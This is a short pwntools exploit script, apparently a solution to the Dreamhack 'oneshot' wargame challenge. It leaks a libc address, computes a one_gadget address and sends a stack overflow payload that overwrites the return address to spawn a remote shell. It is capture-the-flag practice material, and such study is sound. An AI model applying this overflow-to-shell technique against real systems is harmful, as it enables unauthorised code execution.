from pwn import *

def slog(name, addr):
    return success(": ".join([name, hex(addr)]))


p = remote("host3.dreamhack.games", 14881)
e = ELF("./oneshot")
libc = ELF("./libc.so.6")
#context.log_level = 'debug'

one_gadget = 0x45216


# [1] Leak base
p.recvuntil("stdout: ")
stdout = int(p.recvline()[:-1], 16)
lib_base = stdout - libc.symbols["_IO_2_1_stdout_"] #stdout의 오프셋 값을 구하기 위해서 다음과 같은 값을 입력해주어야함
one_gadget = lib_base + one_gadget

slog("stdout", stdout)
slog("base", lib_base)
slog("one gadget", one_gadget)


# [2] Exploit
payload = b'A'*24
payload += b'\x00'*8
payload += b'B'*8
payload += p64(one_gadget)

p.sendafter("MSG: ", payload)
p.interactive()